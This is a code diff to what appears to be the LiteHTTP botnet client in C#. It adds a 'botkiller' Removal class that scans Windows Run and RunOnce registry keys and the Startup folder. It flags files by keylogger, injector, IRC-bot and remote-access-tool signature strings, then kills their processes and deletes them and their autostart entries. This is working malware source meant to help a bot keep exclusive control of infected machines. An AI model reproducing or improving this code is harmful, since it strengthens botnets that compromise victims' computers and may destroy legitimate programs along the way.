@@ -1,10 +1,13 @@
 ﻿using System;
+using System.IO;
 using System.Net;
 using System.Text;
 using System.Threading;
 using System.Reflection;
+using System.Diagnostics;
 using System.Windows.Forms;
 using System.Security.Principal;
+using System.Collections.Generic;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 
@@ -254,6 +257,7 @@ namespace LiteHTTP.Classes
         // BEGIN - Botkiller
         private static bool bkill()
         {
+            Removal.ScanThread();
             return true;
         }
         private static void bkillp()
@@ -261,7 +265,7 @@ namespace LiteHTTP.Classes
             do
             {
                 bkill();
-                Thread.Sleep(r.Next(1000, 20000));
+                Thread.Sleep(r.Next(5000, 30000));
             } while (true);
         }
         // END
@@ -357,6 +361,255 @@ namespace LiteHTTP.Classes
                     }
                     ResumeThread(pInfo[1]);
                 }
+            }
+        }
+
+        /* Credit goes to an unknown creator for the "Removal" class
+         * Modified by Zettabit for better efficiency
+         */
+        public class Removal
+        {
+            [DllImport("kernel32.dll")]
+            private static extern long MoveFileExA(string oldname, string newname, long nword);
+            public static string applocal = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            public static string temp = Environment.GetEnvironmentVariable("temp");
+            public static string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            public static string users = Environment.GetEnvironmentVariable("userprofile");
+            public static char split1 = (char)5;
+            public static char split2 = (char)6;
+            private static string[] keylogger = { "SetWindowsHookEx", "GetForegroundWindow", "GetWindowText", "GetAsyncKeyState" };
+            private static string[] injector = { "SetThreadContext", "ZwUnmapViewOfSection", "VirtualAllocEx", "GetExecutingAssembly", "System.Reflection" };
+            private static string[] ircbot = { "PRIVMSG", "JOIN", "USER", "NICK" };
+            private static string[] generic = { "WSAStartup", "gethostbyname", "gethostbyaddr", "gethostname", "bs_fusion_bot", "MAP_GETCOUNTRY", "VS_VERSION_INFO", "LookupAccountNameA", "CryptUnprotectData", "Blackshades NET" };
+            private static string[] crypter = { "MD5CryptoServiceProvider", "RijndaelManaged" };
+            private static List<PossibleThreat> lobj = new List<PossibleThreat>();
+            public struct PossibleThreat
+            {
+                public string fullpath;
+                public bool running;
+                public JudgedAs btype;
+                public string regkey;
+                public string exename;
+            }
+            public enum JudgedAs
+            {
+                Unknown = 17,
+                Keylogger = 18,
+                GenericBot = 19,
+                Injector = 20,
+                IRC_Bot = 21
+            }
+            public static void ScanThread()
+            {
+                Console.WriteLine("Starting a scan...");
+                Thread exscan = new Thread(new ThreadStart(scan));
+                exscan.SetApartmentState(ApartmentState.STA);
+                exscan.Start();
+                GC.Collect();
+            }
+            public static void scan()
+            {
+                try
+                {
+                    lobj.Clear();
+                    List<string> suspicious = new List<string>();
+                    foreach (string s in returnHKCU("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
+                    {
+                        suspicious.Add(s);
+                    }
+                    foreach (string s in returnHKCU("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
+                    {
+                        suspicious.Add(s);
+                    }
+                    foreach (string s in returnHKLM("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
+                    {
+                        suspicious.Add(s);
+                    }
+                    foreach (string s in returnHKLM("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
+                    {
+                        suspicious.Add(s);
+                    }
+                    foreach (string s in returnDirs(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
+                    {
+                        suspicious.Add(s);
+                    }
+                    foreach (string f in suspicious)
+                    {
+                        try
+                        {
+                            if (usepath(f.Split(split1)[0]))
+                                lobj.Add(scanFile(f));
+                        }
+                        catch { }
+                    }
+                    for (int i = 0; i == lobj.Count - 1; i++)
+                    {
+                        removeThreat(i);
+                    }
+                }
+                catch { }
+            }
+            public static PossibleThreat scanFile(string path)
+            {
+                try
+                {
+                    if (File.Exists(path.Split(split1)[0]))
+                    {
+                        PossibleThreat info = new PossibleThreat();
+                        info.fullpath = path.Split(split1)[0];
+                        info.regkey = path.Split(split1)[1];
+                        info.running = isRunning(path);
+                        info.exename = Path.GetFileName(info.fullpath);
+                        info.btype = JudgedAs.Unknown;
+                        if (info.fullpath == Misc.getLocation())
+                            return new PossibleThreat();
+
+                        string tempstr = Encoding.UTF8.GetString(File.ReadAllBytes(info.fullpath)).Trim((char)0);
+                        if (tempstr != null)
+                        {
+                            foreach (string s in generic)
+                            {
+                                if (tempstr.Contains(s))
+                                    info.btype = JudgedAs.GenericBot;
+                            }
+                            foreach (string s in keylogger)
+                            {
+                                if (tempstr.Contains(s))
+                                    info.btype = JudgedAs.Keylogger;
+                            }
+                            foreach (string s in injector)
+                            {
+                                if (tempstr.Contains(s))
+                                    info.btype = JudgedAs.Injector;
+                            }
+                            foreach (string s in ircbot)
+                            {
+                                if (tempstr.Contains(s))
+                                    info.btype = JudgedAs.IRC_Bot;
+                            }
+                            return info;
+                        }
+                        else
+                        {
+                            return new PossibleThreat();
+                        }
+                    }
+                    else
+                    {
+                        return new PossibleThreat();
+                    }
+                }
+                catch { return new PossibleThreat(); }
+            }
+            private static void removeThreat(int lid)
+            {
+                try
+                {
+                    foreach (Process p in Process.GetProcesses())
+                    {
+                        try
+                        {
+                            if (p.MainModule.FileName == lobj[lid].fullpath)
+                            {
+                                p.Kill();
+                                Thread.Sleep(1000);
+                            }
+                        }
+                        catch { }
+                    }
+                    File.Delete(lobj[lid].fullpath);
+                    Thread.Sleep(1000);
+                    if (lobj[lid].regkey != "" || lobj[lid].regkey != null)
+                    {
+                        switch (lobj[lid].regkey.Split('\\')[0])
+                        {
+                            case "HKEY_CURRENT_USER":
+                                string tmp = lobj[lid].regkey.Remove(0, lobj[lid].regkey.IndexOf("\\", StringComparison.Ordinal) + 1);
+                                string subkey = tmp.Substring(0, tmp.LastIndexOf('\\'));
+                                string name = tmp.Remove(0, tmp.LastIndexOf('\\') + 1);
+                                Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(subkey, true);
+                                regkey.DeleteValue(name);
+                                break;
+
+                            case "HKEY_LOCAL_MACHINE":
+                                string tmp2 = lobj[lid].regkey.Remove(0, lobj[lid].regkey.IndexOf("\\", StringComparison.Ordinal) + 1);
+                                string subkey2 = tmp2.Substring(0, tmp2.LastIndexOf('\\'));
+                                string name2 = tmp2.Remove(0, tmp2.LastIndexOf('\\') + 1);
+                                Microsoft.Win32.RegistryKey regkey2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(subkey2, true);
+                                regkey2.DeleteValue(name2);
+                                break;
+                        }
+                    }
+                    Thread.Sleep(1000);
+                }
+                catch { }
+            }
+            private static bool usepath(string path)
+            {
+                if (path.Contains(users))
+                    return true;
+                else
+                    return false;
+            }
+            private static List<string> returnHKCU(string key)
+            {
+                List<string> rstrs = new List<string>();
+                foreach (string r in Microsoft.Win32.Registry.CurrentUser.OpenSubKey(key, false).GetValueNames())
+                {
+                    string rv = (string)Microsoft.Win32.Registry.CurrentUser.OpenSubKey(key, false).GetValue(r);
+                    if (rv.Contains("\""))
+                        rv = rv.Split('"')[1];
+                    if (rv.Contains("-"))
+                        rv = rv.Split('-')[0];
+                    if (rv.Contains("/"))
+                        rv = rv.Split('/')[0];
+                    if (rv.Contains(".exe") || rv.Contains(".dll") || rv.Contains(".bat") || rv.Contains(".vbs") || rv.Contains(".scr"))
+                        rstrs.Add(rv + split1 + "HKEY_CURRENT_USER\\" + key + "\\" + r);
+                }
+                return rstrs;
+            }
+            private static List<string> returnHKLM(string key)
+            {
+                List<string> rstrs = new List<string>();
+                foreach (string r in Microsoft.Win32.Registry.LocalMachine.OpenSubKey(key, false).GetValueNames())
+                {
+                    string rv = (string)Microsoft.Win32.Registry.LocalMachine.OpenSubKey(key, false).GetValue(r);
+                    if (rv.Contains("\""))
+                        rv = rv.Split('"')[1];
+                    if (rv.Contains("-"))
+                        rv = rv.Split('-')[0];
+                    if (rv.Contains("/"))
+                        rv = rv.Split('/')[0];
+                    if (rv.Contains(".exe") || rv.Contains(".dll") || rv.Contains(".bat") || rv.Contains(".vbs") || rv.Contains(".scr"))
+                        rstrs.Add(rv + split1 + "HKEY_LOCAL_MACHINE\\" + key + "\\" + r);
+                }
+                return rstrs;
+            }
+            private static List<string> returnDirs(string path)
+            {
+                List<string> rstrs = new List<string>();
+                foreach (FileInfo f in new DirectoryInfo(path).GetFiles())
+                {
+                    if (f.FullName.Contains(".exe") || f.FullName.Contains(".dll") || f.FullName.Contains(".bat") || f.FullName.Contains(".vbs") || f.FullName.Contains(".scr"))
+                        rstrs.Add(f.FullName + split1 + f.FullName);
+                }
+                return rstrs;
+            }
+            private static bool isRunning(string fullpath)
+            {
+                bool ret = false;
+                try
+                {
+                    foreach (Process p in Process.GetProcesses())
+                    {
+                        if (p.MainModule.FileName == fullpath)
+                            ret = true;
+                        break;
+                    }
+                }
+                catch { }
+                return ret;
             }
         }
     }
